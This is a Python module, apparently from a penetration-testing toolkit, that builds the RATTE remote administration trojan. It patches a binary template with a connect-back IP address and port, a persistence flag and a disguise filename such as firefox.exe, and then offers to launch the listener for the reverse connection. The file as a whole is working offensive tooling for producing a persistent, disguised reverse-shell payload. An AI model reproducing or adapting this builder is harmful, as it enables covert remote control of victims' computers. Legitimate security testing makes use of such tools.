#!/usr/bin/env python
#
# These are required fields
#
import sys
import subprocess
import os
from src.core.setcore import *

# "This is RATTE (Remote Administration Tool Tommy Edition) prepare module.It will prepare a custom ratteM.exe."
MAIN=" RATTE (Remote Administration Tool Tommy Edition) Create Payload only. Read the readme/RATTE-Readme.txt first"
AUTHOR=" Thomas Werth"
	
#
# Start ratteserver
#
def ratte_listener_start(port):
		
	subprocess.Popen("src/payloads/ratte/ratteserver %d" % (port), shell=True).wait()
		
def prepare_ratte(ipaddr,ratteport, persistent,customexe):
	
	PrintInfo("preparing RATTE...")
	# replace ipaddress with one that we need for reverse connection back
	############
	#Load content of RATTE
	############
	fileopen=open("src/payloads/ratte/ratte.binary" , "rb")
	data=fileopen.read()
	fileopen.close()

	############
	#PATCH Server IP into RATTE
	############
	filewrite=open("src/program_junk/ratteM.exe", "wb")

	host=int(len(ipaddr)+1) * "X"
	rPort=int(len(str(ratteport))+1) * "Y"
	pers=int(len(str(persistent))+1) * "Z"
	#check ob cexe > 0, sonst wird ein Feld gepatcht (falsch!)
	if len(str(customexe)) > 0:
		cexe=int(len(str(customexe))+1) * "Q"
	else:
		cexe=""

	filewrite.write(data.replace(str(cexe), customexe+"\x00", 1).replace(str(pers), persistent+"\x00", 1).replace(str(host), ipaddr+"\x00", 1).replace(str(rPort), str(ratteport)+"\x00", 1) )

	# filewrite.write(data.replace(str(host), ipaddr+"\x00", 1).replace(str(rPort), str(ratteport)+"\x00", 1) )
	#filewrite.write(data.replace(str(pers), persistent+"\x00", 1).replace(str(host), ipaddr+"\x00", 1).replace(str(rPort), str(ratteport)+"\x00", 1) )
	filewrite.close()
	
# def main(): header is required
def main():
	
	############
	# get User Input
	############
	ipaddr=raw_input(setprompt(["9", "2"], "IP address to connect back on"))
	try:
		ratteport=int(raw_input(setprompt(["9", "2"], "Port RATTE Server should listen on")))
		while ratteport==0 or ratteport > 65535:
			PrintWarning('Port must not be equal to javaport!')
			ratteport=int(raw_input(setprompt(["9", "2"], "Enter port RATTE Server should listen on")))
	except ValueError:
		ratteport=8080
	
	persistent=raw_input(setprompt(["9", "2"], "Should RATTE be persistent [no|yes]?"))
	if persistent == "no" or persistent == "" or persistent == "n":
		persistent="NO"
	else:
		persistent="YES"
		
	customexe=raw_input(setprompt(["9", "2"], "Use specifix filename (ex. firefox.exe) [filename.exe or empty]?"))

	############
	# prepare RATTE
	############
	prepare_ratte(ipaddr,ratteport,persistent,customexe)

	PrintStatus("Payload has been exported to src/program_junk/ratteM.exe")
	
	############
	# start ratteserver 
	############
	prompt=raw_input(setprompt(["9", "2"], "Start the ratteserver listener now [yes|no]"))
	if prompt == "yes" or prompt == "" or prompt == "y":
		PrintInfo("Starting ratteserver...")
		ratte_listener_start(ratteport)
